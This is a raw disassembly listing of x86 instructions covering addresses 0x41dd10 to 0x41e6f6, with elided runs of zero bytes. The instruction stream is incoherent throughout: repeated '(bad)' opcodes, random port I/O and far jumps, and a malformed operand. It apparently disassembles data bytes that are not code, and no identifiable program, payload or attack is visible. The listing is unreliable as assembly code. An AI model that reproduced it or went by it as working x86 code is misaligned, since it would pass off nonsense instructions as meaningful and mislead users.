  41dd10:	stc    
  41dd11:	clc    
  41dd12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd13:	mov    ch,BYTE PTR [edx+0x79]
  41dd16:	lds    ebx,FWORD PTR [esp+edx*1-0x2e]
  41dd1a:	or     BYTE PTR [esi+0x4e],0xe1
  41dd1e:	ss push edx
  41dd20:	arpl   cx,bx
  41dd22:	mul    BYTE PTR [ebx-0x43e532f2]
  41dd28:	sub    al,0xb8
  41dd2a:	dec    edx
  41dd2b:	jge    0x41dcfc
  41dd2d:	pop    ebx
  41dd2e:	imul   ebp,DWORD PTR [edx-0x2a09e1e4],0x1
  41dd35:	inc    edx
  41dd36:	mov    DWORD PTR ds:[eax-0x497827d6],esp
  41dd3d:	ds xchg esi,eax
  41dd3f:	mov    al,0xb1
  41dd41:	fs mov bh,0xf4
  41dd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd45:	std    
  41dd46:	test   al,0x29
  41dd48:	and    esp,DWORD PTR [ebx-0x2f]
  41dd4b:	hlt    
  41dd4c:	xor    bl,0xb1
  41dd4f:	jbe    0x41dd4e
  41dd51:	test   DWORD PTR [eax],edx
  41dd53:	test   eax,0x2b67ca2
  41dd58:	test   DWORD PTR [esi+edi*8+0x7e344fde],esp
  41dd5f:	fs ds xchg esi,eax
  41dd62:	addr16 inc ebx
  41dd64:	inc    ebp
  41dd65:	mov    bl,0xcd
  41dd67:	jb     0x41dda2
  41dd69:	mov    eax,0xba8e014e
  41dd6e:	lods   al,BYTE PTR ds:[esi]
  41dd6f:	mov    dl,0xa2
  41dd71:	xlat   BYTE PTR ds:[ebx]
  41dd72:	leave  
  41dd73:	lods   eax,DWORD PTR ds:[esi]
  41dd74:	mov    eax,ds:0xf125ca83
  41dd79:	jle    0x41ddb9
  41dd7b:	pusha  
  41dd7c:	sub    BYTE PTR [eax-0x7dbffd33],0xbc
  41dd83:	fs stos BYTE PTR es:[edi],al
  41dd85:	jmp    0x41ddca
  41dd87:	pop    ds
  41dd88:	and    al,0x3d
  41dd8a:	iret   
  41dd8b:	in     eax,dx
  41dd8c:	jae    0x41dd47
  41dd8e:	data16 loope 0x41dd9f
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	push   esi
  41de01:	shl    BYTE PTR [ebx-0x55],1
  41de04:	out    dx,al
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	imul   ebp,DWORD PTR [esi-0x64cfb2d7],0x6c
  41de13:	dec    eax
  41de14:	push   0xe8243eed
  41de19:	icebp  
  41de1a:	xchg   edx,eax
  41de1b:	push   es
  41de1c:	and    BYTE PTR [ebp+0x7870d2e],ch
  41de22:	icebp  
  41de23:	jno    0x41de18
  41de25:	push   ds
  41de26:	xor    al,0x68
  41de28:	ret    0xfae9
  41de2b:	stc    
  41de2c:	pop    ecx
  41de2d:	adc    ch,ah
  41de2f:	popa   
  41de30:	jne    0x41de40
  41de32:	or     esi,DWORD PTR [eax]
  41de34:	ins    DWORD PTR es:[edi],dx
  41de35:	mov    bl,0x60
  41de37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de38:	push   ds
  41de39:	push   ecx
  41de3a:	std    
  41de3b:	cmc    
  41de3c:	pop    esp
  41de3d:	mov    esi,0x7154e828
  41de42:	mov    WORD PTR [ebx-0x629be1cd],gs
  41de48:	mov    ebp,0x241e0053
  41de4d:	or     edx,0x38
  41de50:	jae    0x41deac
  41de52:	xchg   DWORD PTR [esi+ebp*8+0x64],edi
  41de56:	outs   dx,DWORD PTR ds:[esi]
  41de57:	and    bh,bh
  41de59:	mov    BYTE PTR ds:0xf29e1e52,bh
  41de5f:	jno    0x41debf
  41de61:	sub    al,0x2f
  41de63:	shl    DWORD PTR [ecx],1
  41de65:	or     al,0x34
  41de67:	adc    eax,DWORD PTR [ebx-0x20927d97]
  41de6d:	clc    
  41de6e:	sub    al,0xec
  41de70:	mov    eax,ds:0x3f1b3af6
  41de75:	aaa    
  41de76:	add    edx,DWORD PTR [ebp-0x51455250]
  41de7c:	cli    
  41de7d:	sub    al,bh
  41de7f:	in     eax,dx
  41de80:	mov    cl,0xa1
  41de82:	sub    eax,DWORD PTR ds:0x146d4bf9
  41de88:	jmp    0x41de9a
  41de8a:	outs   dx,DWORD PTR ds:[esi]
  41de8b:	(bad)  
  41de8c:	(bad)  
  41de8d:	push   edi
  41de8e:	mov    DWORD PTR [eax-0x1d],esi
  41de91:	fistp  DWORD PTR [eax+0x19]
  41de94:	popa   
  41de95:	jmp    0xc1d6:0x82fba5b4
  41de9c:	retf   
  41de9d:	lds    esi,FWORD PTR [edx-0x49]
  41dea0:	aam    0x1d
  41dea2:	push   ecx
  41dea3:	ss pop ebp
  41dea5:	push   cs
  41dea6:	mov    esp,0x3c91157b
  41deab:	pop    ss
  41deac:	out    dx,al
  41dead:	(bad)  
  41deae:	xlat   BYTE PTR ds:[ebx]
  41deaf:	out    dx,al
  41deb0:	adc    DWORD PTR [edi+0x66],0x244df22b
  41deb7:	inc    ecx
  41deb8:	imul   edx,DWORD PTR [ebx-0x30],0xffffffbd
  41debc:	mov    BYTE PTR [esi-0xa88844f],dh
  41dec2:	ins    BYTE PTR es:[edi],dx
  41dec3:	inc    ecx
  41dec4:	mov    ds:0x405d5b19,al
  41dec9:	sar    DWORD PTR [esi-0x3d],0x87
  41decd:	loope  0x41deee
  41decf:	or     al,0xfb
  41ded1:	das    
  41ded2:	inc    edx
  41ded3:	imul   ebx,DWORD PTR [eax-0x4fcd0a9b],0x61
  41deda:	push   cs
  41dedb:	sti    
  41dedc:	push   eax
  41dedd:	in     al,dx
  41dede:	cmp    dl,BYTE PTR [edi+0x4a2c426]
  41dee4:	xchg   ecx,eax
  41dee5:	dec    ebp
  41dee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee7:	and    al,0x80
  41dee9:	leave  
  41deea:	jg     0x41ded8
  41deec:	fisubr DWORD PTR [ecx-0x17]
  41deef:	ret    0xfd2d
  41def2:	dec    ebx
  41def3:	xchg   ebx,ecx
  41def5:	dec    ecx
  41def6:	add    esp,esi
  41def8:	retf   0xa230
  41defb:	pop    ds
  41defc:	pop    ss
  41defd:	jo     0x41df3d
  41deff:	cdq    
  41df00:	icebp  
  41df01:	inc    ebx
  41df02:	mov    ebp,0x4636d23c
  41df07:	and    dl,BYTE PTR [ebx-0x45]
  41df0a:	mov    ecx,0x9673269
  41df0f:	and    cl,ch
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x77ec9ce9
  41df82:	sub    dh,bl
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x1e000001
  41df8d:	mov    ecx,DWORD PTR cs:[edx+0x47]
  41df91:	push   ecx
  41df92:	xchg   esi,eax
  41df93:	aas    
  41df94:	call   0xaf9febea
  41df99:	jecxz  0x41df20
  41df9b:	jmp    0x4a24:0xba39c609
  41dfa2:	stos   DWORD PTR es:[edi],eax
  41dfa3:	pushf  
  41dfa4:	retf   0x4393
  41dfa7:	add    edi,DWORD PTR [edx-0x5407eb47]
  41dfad:	xor    DWORD PTR [edi+0x36d37000],esp
  41dfb3:	xor    edx,DWORD PTR [esi-0x48]
  41dfb6:	(bad)  
  41dfb7:	adc    al,0xb3
  41dfb9:	pusha  
  41dfba:	stos   BYTE PTR es:[edi],al
  41dfbb:	adc    bl,al
  41dfbd:	jae    0x41dfd2
  41dfbf:	sbb    eax,0x145af2f1
  41dfc4:	enter  0xf7dc,0x44
  41dfc8:	retf   
  41dfc9:	je     0x41df8e
  41dfcb:	adc    esi,esi
  41dfcd:	(bad)  
  41dfce:	imul   ebx,DWORD PTR [edi+edi*2-0x46],0xffffffa1
  41dfd3:	add    BYTE PTR [eax+eax*4+0x48b8348],bh
  41dfda:	(bad)  
  41dfdb:	mov    dl,0x64
  41dfdd:	cli    
  41dfde:	les    edi,FWORD PTR [bx+di-0x3fd4]
  41dfe3:	js     0x41e008
  41dfe5:	dec    ecx
  41dfe6:	sar    DWORD PTR [ebp-0x12],1
  41dfe9:	rcr    DWORD PTR [edi+edi*2+0x1a],0x45
  41dfee:	mov    esi,0x3e3449e2
  41dff3:	mov    edx,0x4cf7b02a
  41dff8:	lea    ecx,[esi+ebp*1+0x4e]
  41dffc:	inc    edx
  41dffd:	lods   al,BYTE PTR ds:[esi]
  41dffe:	mov    al,BYTE PTR [edi-0x57523f9a]
  41e004:	call   0x387cbd7e
  41e009:	mov    ah,0x45
  41e00b:	jecxz  0x41e000
  41e00d:	xchg   ecx,eax
  41e00e:	sbb    ebx,esi
  41e010:	fisttp DWORD PTR [eax+0x372df3d1]
  41e016:	jnp    0x41e025
  41e018:	ins    DWORD PTR es:[edi],dx
  41e019:	ins    DWORD PTR es:[edi],dx
  41e01a:	scas   eax,DWORD PTR es:[edi]
  41e01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e01c:	mov    cl,0x1f
  41e01e:	js     0x41e00d
  41e020:	dec    DWORD PTR [edx-0x36]
  41e023:	jne    0x41dfeb
  41e025:	enter  0xd23,0xeb
  41e029:	sbb    DWORD PTR [ebx-0x65c70154],0xd170d3b8
  41e033:	xchg   edx,eax
  41e034:	pop    ecx
  41e035:	sub    eax,0x2657f59a
  41e03a:	push   ds
  41e03b:	int    0xc4
  41e03d:	into   
  41e03e:	(bad)  
  41e03f:	push   cs
  41e040:	mov    esp,0x18b2aa5
  41e045:	(bad)  
  41e046:	out    dx,eax
  41e047:	xor    al,0x15
  41e049:	push   ebp
  41e04a:	clc    
  41e04b:	xor    dh,BYTE PTR [edi-0x6ff2780e]
  41e051:	dec    ebx
  41e052:	ffreep st(5)
  41e054:	mov    ds:0x9fa3453d,al
  41e059:	fs int3 
  41e05b:	xor    eax,0x4107ff93
  41e060:	inc    edx
  41e061:	repnz mov BYTE PTR [edi],bl
  41e064:	add    edx,DWORD PTR [eax+ebp*8]
  41e067:	or     al,0x9a
  41e069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06a:	jns    0x41e0c9
  41e06c:	mov    ch,0x89
  41e06e:	in     al,0xa7
  41e070:	call   0x293d:0x29e1421a
  41e077:	jg     0x41e096
  41e079:	cmp    al,dh
  41e07b:	push   cs
  41e07c:	push   0xe2dd7a3e
  41e081:	fwait
  41e082:	lods   eax,DWORD PTR ds:[esi]
  41e083:	ret    
  41e084:	dec    edi
  41e085:	daa    
  41e086:	mov    cl,bh
  41e088:	cmc    
  41e089:	out    dx,eax
  41e08a:	inc    eax
  41e08b:	inc    esi
  41e08c:	pop    eax
  41e08d:	jbe    0x41e036
  41e08f:	pushf  
  41e090:	mov    eax,0x0
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	popf   
  41e101:	inc    eax
  41e102:	dec    ebx
  41e103:	adc    eax,0x13ff8
  41e108:	add    eax,0x17000001
  41e10d:	and    ebp,esi
  41e10f:	imul   esi,edx,0xfffffff4
  41e112:	retf   
  41e113:	push   0xffffffea
  41e115:	int3   
  41e116:	push   cs
  41e117:	sti    
  41e118:	nop
  41e119:	daa    
  41e11a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e11b:	jecxz  0x41e14b
  41e11d:	push   edx
  41e11e:	push   edi
  41e11f:	call   0x8e46:0x6dd3fb98
  41e126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e127:	mov    ah,0x18
  41e129:	push   ds
  41e12a:	test   esp,edx
  41e12c:	mov    esi,0x286f30cc
  41e131:	fsubr  st,st(7)
  41e133:	data16 xlat BYTE PTR ds:[ebx]
  41e135:	sub    edi,0xad7038d9
  41e13b:	(bad)  
  41e13c:	mov    edx,0xa824aaa5
  41e141:	(bad)  
  41e142:	(bad)  
  41e143:	ds arpl bx,sp
  41e146:	mov    bl,0x75
  41e148:	mov    edi,0x5d7523e9
  41e14d:	fadd   QWORD PTR [ebx+0x73f96264]
  41e153:	mov    ?,WORD PTR [edx+0x39]
  41e156:	dec    edx
  41e157:	and    al,0x3c
  41e159:	cli    
  41e15a:	std    
  41e15b:	fimul  WORD PTR [ebx+0x44]
  41e15e:	repnz sub DWORD PTR [ebp-0x1a],0xffffff9b
  41e163:	es dec edi
  41e165:	push   esi
  41e166:	xchg   edx,eax
  41e167:	lods   al,BYTE PTR ds:[esi]
  41e168:	je     0x41e18b
  41e16a:	mov    ebx,0xf7c02421
  41e16f:	jg     0x41e143
  41e171:	pop    ecx
  41e172:	pop    ds
  41e173:	(bad)  
  41e174:	les    ecx,FWORD PTR ds:0xd283e324
  41e17a:	push   eax
  41e17b:	pushf  
  41e17c:	jns    0x41e1eb
  41e17e:	daa    
  41e17f:	cmp    bh,BYTE PTR [edx]
  41e181:	and    edi,DWORD PTR [edi]
  41e183:	or     al,0x93
  41e185:	in     al,0xfc
  41e187:	das    
  41e188:	dec    ebp
  41e189:	sbb    al,bh
  41e18b:	stc    
  41e18c:	jb     0x41e18e
  41e18e:	shl    ebx,cl
  41e190:	rol    BYTE PTR [esi+0x37],0xde
  41e194:	push   0xc24c82e
  41e199:	xchg   ebp,eax
  41e19a:	dec    edi
  41e19b:	or     ah,BYTE PTR [eax]
  41e19d:	pop    ds
  41e19e:	xchg   edi,eax
  41e19f:	sbb    esp,eax
  41e1a1:	ror    DWORD PTR [eax+ebx*4],0x8b
  41e1a5:	in     eax,0x9f
  41e1a7:	inc    esp
  41e1a8:	lea    esp,[edx+0x5455797c]
  41e1ae:	jmp    0x680aec8c
  41e1b3:	inc    edx
  41e1b4:	push   0xffffffad
  41e1b6:	daa    
  41e1b7:	or     al,0xfc
  41e1b9:	xchg   ecx,eax
  41e1ba:	(bad)  
  41e1bb:	dec    edi
  41e1bc:	lds    edx,FWORD PTR [edi+0x47]
  41e1bf:	mov    ds:0x58f37001,eax
  41e1c4:	fcom   QWORD PTR [edi]
  41e1c6:	stc    
  41e1c7:	add    eax,0x802dee53
  41e1cc:	xchg   ebx,eax
  41e1cd:	sub    bl,0x56
  41e1d0:	mov    dh,0x96
  41e1d2:	scas   al,BYTE PTR es:[edi]
  41e1d3:	mov    bl,0x84
  41e1d5:	stos   BYTE PTR es:[edi],al
  41e1d6:	mov    ebx,0xdc2a3140
  41e1db:	pop    ebp
  41e1dc:	aas    
  41e1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1de:	push   0x1f526f3f
  41e1e3:	xchg   edx,eax
  41e1e4:	(bad)  
  41e1e5:	int    0x56
  41e1e7:	outs   dx,BYTE PTR ds:[esi]
  41e1e8:	ss mov ah,0xab
  41e1eb:	test   BYTE PTR ds:0x46ee9fb8,bl
  41e1f1:	dec    eax
  41e1f2:	jae    0x41e1cf
  41e1f4:	mov    cs,WORD PTR [esp+esi*8+0x4c9a4327]
  41e1fb:	test   BYTE PTR [edx+0x14],ch
  41e1fe:	out    dx,eax
  41e1ff:	jp     0x41e25a
  41e201:	fcomp  st(6)
  41e203:	dec    eax
  41e204:	retf   0xffd
  41e207:	xor    esp,DWORD PTR [ecx-0x2d]
  41e20a:	and    eax,0xb1dad10f
  41e20f:	nop
  41e210:	jl     0x41e212
	...
  41e272:	add    BYTE PTR [eax],al
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x3
  41e281:	add    cl,BYTE PTR [edx+0x47]
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0xed000001
  41e28d:	pop    es
  41e28e:	inc    eax
  41e28f:	call   0xc5b70513
  41e294:	sar    BYTE PTR [ecx+0x78],cl
  41e297:	jl     0x41e21b
  41e299:	cld    
  41e29a:	or     al,0x8a
  41e29c:	pop    esi
  41e29d:	push   edi
  41e29e:	adc    BYTE PTR [ebx-0x80],ah
  41e2a1:	ret    
  41e2a2:	xchg   BYTE PTR gs:[ebp+ebp*4-0x48eace31],dl
  41e2aa:	int3   
  41e2ab:	in     al,dx
  41e2ac:	and    BYTE PTR [edx],dh
  41e2ae:	sbb    ebp,ebx
  41e2b0:	repnz aam 0xf4
  41e2b3:	mov    eax,DWORD PTR [ebx-0x5]
  41e2b6:	dec    eax
  41e2b7:	imul   eax,ecx,0xffffff9b
  41e2ba:	jmp    0xaad4:0xf1d9e80d
  41e2c1:	inc    ebp
  41e2c2:	xor    edx,DWORD PTR [ecx+ebp*4]
  41e2c5:	lock push DWORD PTR [esp+eax*8]
  41e2c9:	adc    edi,DWORD PTR [eax]
  41e2cb:	xor    ecx,DWORD PTR [esi]
  41e2cd:	push   ss
  41e2ce:	dec    edx
  41e2cf:	add    DWORD PTR [ebp+0x72],ebp
  41e2d2:	mov    al,0x4d
  41e2d4:	cmp    cl,BYTE PTR [ebp+0x61d8d24b]
  41e2da:	dec    ebx
  41e2db:	inc    eax
  41e2dc:	das    
  41e2dd:	scas   eax,DWORD PTR es:[edi]
  41e2de:	adc    BYTE PTR [edx+0x82c2c9f],dl
  41e2e4:	pop    edi
  41e2e5:	(bad)  
  41e2e6:	fcomp  DWORD PTR [edi-0x55ffe796]
  41e2ec:	in     eax,0x23
  41e2ee:	xrelease xchg DWORD PTR [esi+0x7f],ecx
  41e2f2:	sbb    cl,BYTE PTR [ecx+0x74]
  41e2f5:	mov    edx,0xd411b9ba
  41e2fa:	cmp    DWORD PTR [edi+0x21],esp
  41e2fd:	cli    
  41e2fe:	push   esi
  41e2ff:	xor    al,BYTE PTR [edx]
  41e301:	test   ch,0xc8
  41e304:	mov    ecx,0xf734d1a3
  41e309:	arpl   cx,ax
  41e30b:	dec    esi
  41e30c:	aas    
  41e30d:	push   edi
  41e30e:	aad    0x87
  41e310:	inc    edi
  41e311:	shr    DWORD PTR [ecx+0x10],0x77
  41e315:	scas   al,BYTE PTR es:[edi]
  41e316:	sbb    al,0xd9
  41e318:	or     ebp,DWORD PTR [eax+0x60e8738b]
  41e31e:	inc    edx
  41e31f:	cmp    ah,BYTE PTR [esp+ebp*4]
  41e322:	push   0x2e
  41e324:	jno    0x41e399
  41e326:	stc    
  41e327:	or     al,0x1
  41e329:	or     BYTE PTR [edi],0x28
  41e32c:	inc    edi
  41e32d:	fdivr  DWORD PTR [esi-0x50]
  41e330:	or     esp,0x62a97b6c
  41e336:	loope  0x41e321
  41e338:	xor    ch,0xb4
  41e33b:	or     dl,ah
  41e33d:	xchg   ebp,eax
  41e33e:	dec    edx
  41e33f:	aad    0xf8
  41e341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e342:	sbb    edi,DWORD PTR [ebx]
  41e344:	jb     0x41e361
  41e346:	jle    0x41e2ef
  41e348:	inc    esp
  41e349:	rcr    DWORD PTR [esi+0x2b0837e6],cl
  41e34f:	dec    eax
  41e350:	test   eax,0x962e5501
  41e355:	and    DWORD PTR [edi],0x55
  41e358:	stos   BYTE PTR es:[edi],al
  41e359:	arpl   WORD PTR [ecx],di
  41e35b:	sub    BYTE PTR [edi-0x5f],dh
  41e35e:	sub    DWORD PTR [eax],eax
  41e360:	in     al,dx
  41e361:	add    DWORD PTR [ebx],ebp
  41e363:	push   0x3
  41e365:	(bad)  
  41e366:	mov    ds:0x61912097,al
  41e36b:	(bad)  
  41e36c:	fucomi st,st(6)
  41e36e:	rol    DWORD PTR ds:0xd512dccc,1
  41e374:	lahf   
  41e375:	pushf  
  41e376:	loopne 0x41e3ad
  41e378:	(bad)  
  41e379:	cmp    esi,DWORD PTR [edi-0x3]
  41e37c:	xchg   edi,eax
  41e37d:	ficomp WORD PTR [ecx+0x35aadf68]
  41e383:	mov    bh,0x6a
  41e385:	sub    BYTE PTR [edx+0x561ff4f6],dh
  41e38b:	and    DWORD PTR [ebp+0x15],0x7c038b
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xd5aa4809
  41e403:	mov    eax,ds:0x14202
  41e408:	add    eax,0x7000001
  41e40d:	into   
  41e40e:	and    al,0xd9
  41e410:	sbb    edx,ebx
  41e412:	push   ebp
  41e413:	test   al,0xcc
  41e415:	adc    DWORD PTR [ebx+0x6e],0x13
  41e419:	mov    eax,0xb606423b
  41e41e:	dec    ebx
  41e41f:	cmc    
  41e420:	(bad)  
  41e421:	inc    DWORD PTR [edi+0x63]
  41e424:	mov    ecx,0x80a481d7
  41e429:	push   ebx
  41e42a:	pop    esi
  41e42b:	(bad)  
  41e42c:	ss out 0xea,eax
  41e42f:	fwait
  41e430:	inc    eax
  41e431:	ss call 0xf664eb12
  41e437:	aam    0xb6
  41e439:	inc    eax
  41e43a:	dec    ecx
  41e43b:	mov    eax,ds:0x23e80d69
  41e440:	repz in al,0x66
  41e443:	sbb    al,0x5c
  41e445:	and    dl,BYTE PTR [ecx+0x3f]
  41e448:	pop    edi
  41e449:	sbb    ebx,DWORD PTR [edx+0x2d]
  41e44c:	test   al,0x2c
  41e44e:	jl     0x41e429
  41e450:	xor    BYTE PTR [ebp+0x7e],dl
  41e453:	xor    ah,ch
  41e455:	cdq    
  41e456:	(bad)  
  41e457:	aam    0x2c
  41e459:	enter  0xbe8b,0x4f
  41e45d:	inc    ebp
  41e45e:	sub    ebx,DWORD PTR [esi-0x6e7939fb]
  41e464:	out    0x25,al
  41e466:	aad    0x95
  41e468:	push   0x97bde833
  41e46d:	rol    BYTE PTR [ecx],1
  41e46f:	gs std 
  41e471:	retf   0x4ff
  41e474:	xchg   ebp,eax
  41e475:	sbb    ebx,DWORD PTR ds:0x1b307073
  41e47b:	fistp  QWORD PTR [esi]
  41e47d:	(bad)  
  41e47e:	lods   eax,DWORD PTR ds:[esi]
  41e47f:	pop    ecx
  41e480:	jecxz  0x41e458
  41e482:	sub    DWORD PTR [ebx+ecx*1],ebp
  41e485:	mov    esp,esi
  41e487:	(bad)  
  41e488:	jmp    0x41e441
  41e48a:	xor    ebp,DWORD PTR [ecx]
  41e48c:	pop    edi
  41e48d:	add    eax,0x97226a9b
  41e492:	push   edi
  41e493:	cmp    esp,DWORD PTR [edx-0x3a]
  41e496:	inc    eax
  41e497:	rcl    BYTE PTR ds:0xfc2213e5,0x31
  41e49e:	mov    cl,0x64
  41e4a0:	jno    0x41e50a
  41e4a2:	and    DWORD PTR [esi-0x5b],esp
  41e4a5:	not    al
  41e4a7:	jmp    0xed07625e
  41e4ac:	xor    BYTE PTR [edx-0x52],0x3e
  41e4b0:	jbe    0x41e502
  41e4b2:	fwait
  41e4b3:	(bad)  
  41e4b4:	fstp   QWORD PTR [edi+0x24]
  41e4b7:	jle    0x41e52d
  41e4b9:	or     DWORD PTR ds:0x2d9cc51,esi
  41e4bf:	jae    0x41e526
  41e4c1:	mov    esi,0x791cf0e7
  41e4c6:	inc    esp
  41e4c7:	fmul   QWORD PTR [edx]
  41e4c9:	int    0xc7
  41e4cb:	shl    BYTE PTR [eax+0x79],1
  41e4ce:	jmp    0x41e484
  41e4d0:	pushf  
  41e4d1:	dec    eax
  41e4d2:	ins    BYTE PTR es:[edi],dx
  41e4d3:	aaa    
  41e4d4:	or     DWORD PTR [ecx],esp
  41e4d6:	push   ecx
  41e4d7:	lds    eax,FWORD PTR [esi+0x54]
  41e4da:	inc    ecx
  41e4db:	cwde   
  41e4dc:	dec    edi
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	jl     0x41e517
  41e4e0:	jmp    0xf54555c8
  41e4e5:	repz ja 0x41e471
  41e4e8:	data16 outs dx,BYTE PTR ds:[esi]
  41e4ea:	dec    eax
  41e4eb:	mov    al,ds:0x2bcb8ea
  41e4f0:	das    
  41e4f1:	mov    es,WORD PTR [ebx-0x39]
  41e4f4:	dec    esi
  41e4f5:	scas   al,BYTE PTR es:[edi]
  41e4f6:	xor    al,0xf1
  41e4f8:	shl    DWORD PTR [esi+0x1ebbbbba],0x9d
  41e4ff:	xchg   ebp,eax
  41e500:	adc    BYTE PTR [ebx+0x7a],dh
  41e503:	adc    ah,BYTE PTR [edx]
  41e505:	lods   al,BYTE PTR ds:[esi]
  41e506:	fwait
  41e507:	stos   BYTE PTR es:[edi],al
  41e508:	inc    esp
  41e509:	les    ebp,FWORD PTR [eax-0x334d676]
  41e50f:	out    0xe0,eax
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e537
  41e581:	add    edi,DWORD PTR [edi+0x1f]
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xb9000001
  41e58d:	and    BYTE PTR [ecx],0xe6
  41e590:	ret    0x85da
  41e593:	sbb    eax,0x307842a2
  41e598:	je     0x41e559
  41e59a:	ret    
  41e59b:	ins    DWORD PTR es:[edi],dx
  41e59c:	ja     0x41e558
  41e59e:	sub    dh,BYTE PTR [esi+0xd]
  41e5a1:	arpl   WORD PTR [ebp-0x5f],bx
  41e5a4:	push   ebx
  41e5a5:	mov    eax,0xab09b5c
  41e5aa:	push   ecx
  41e5ab:	sahf   
  41e5ac:	call   0x9d777f10
  41e5b1:	test   eax,0x3ba7016a
  41e5b6:	mov    esp,0xf9f3153
  41e5bb:	push   esp
  41e5bc:	lods   al,BYTE PTR ds:[esi]
  41e5bd:	push   ss
  41e5be:	inc    ecx
  41e5bf:	push   0x4283a7e3
  41e5c4:	cwde   
  41e5c5:	add    eax,0x89d9e427
  41e5ca:	mov    eax,0x105cc055
  41e5cf:	cs cmp eax,esp
  41e5d2:	ins    DWORD PTR es:[edi],dx
  41e5d3:	ss jnp 0x41e651
  41e5d6:	mov    BYTE PTR ds:0x2fb5b923,dl
  41e5dc:	pop    edx
  41e5dd:	inc    esi
  41e5de:	sbb    al,0x5d
  41e5e0:	pop    ebx
  41e5e1:	fisttp WORD PTR [ebx-0x7f]
  41e5e4:	sti    
  41e5e5:	(bad)  
  41e5e6:	push   esp
  41e5e7:	mov    ecx,0xaa8bc89a
  41e5ec:	scas   eax,DWORD PTR es:[edi]
  41e5ed:	in     al,0xfe
  41e5ef:	in     eax,0xe5
  41e5f1:	lock and esp,DWORD PTR [ebx+0x4e]
  41e5f5:	imul   DWORD PTR [ebx-0x4bd5d061]
  41e5fb:	xor    al,0xf1
  41e5fd:	fnsave [ecx+eiz*1+0x71]
  41e601:	mov    bh,0xeb
  41e603:	lea    ecx,[edx-0x70]
  41e606:	outs   dx,BYTE PTR ds:[esi]
  41e607:	loope  0x41e5d0
  41e609:	push   edx
  41e60a:	jb     0x41e5a6
  41e60c:	sub    edi,DWORD PTR [esi+0x36]
  41e60f:	inc    esi
  41e610:	mov    dh,0xa7
  41e612:	scas   al,BYTE PTR es:[edi]
  41e613:	and    DWORD PTR [ebp-0x775cf81f],ebx
  41e619:	cmc    
  41e61a:	jmp    0x41e62d
  41e61c:	xchg   esp,ebx
  41e61e:	mov    ebp,edi
  41e620:	aaa    
  41e621:	inc    ebx
  41e622:	adc    DWORD PTR [ebx-0x3d],0x2c
  41e626:	inc    ebx
  41e627:	mov    BYTE PTR [eax],ah
  41e629:	retf   0xc075
  41e62c:	mov    bh,0x48
  41e62e:	test   DWORD PTR [edx+0x7a],edi
  41e631:	call   DWORD PTR [edx-0x5f]
  41e634:	fxch   st(3)
  41e636:	(bad)  
  41e637:	test   DWORD PTR ds:0x95ece49f,0xcf46b935
  41e641:	push   ecx
  41e642:	xchg   edx,eax
  41e643:	xchg   edi,eax
  41e644:	xor    ah,0x30
  41e647:	(bad)  
  41e648:	daa    
  41e649:	adc    al,0x29
  41e64b:	shl    BYTE PTR [ebx-0x66ec89dc],cl
  41e651:	push   ecx
  41e652:	jns    0x41e623
  41e654:	push   edi
  41e655:	jb     0x41e656
  41e657:	adc    DWORD PTR [edx-0x1c],esp
  41e65a:	mov    al,ds:0x8b75657c
  41e65f:	jecxz  0x41e6de
  41e661:	xchg   DWORD PTR [edi+0x2d],edi
  41e664:	xchg   ebx,eax
  41e665:	test   BYTE PTR [ebp-0x2e],al
  41e668:	cmp    eax,0x13371476
  41e66d:	in     al,dx
  41e66e:	shr    DWORD PTR [edx-0x5df7f343],cl
  41e674:	popa   
  41e675:	shl    BYTE PTR [ebp-0x51eef071],1
  41e67b:	jmp    0xcba8:0x3e8a9fda
  41e682:	bound  esp,QWORD PTR [edi+eax*1+0x62]
  41e686:	mov    BYTE PTR [edx+0x7c4bb101],bh
  41e68c:	and    eax,0xffffff89
  41e68f:	inc    esi
  41e690:	nop
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
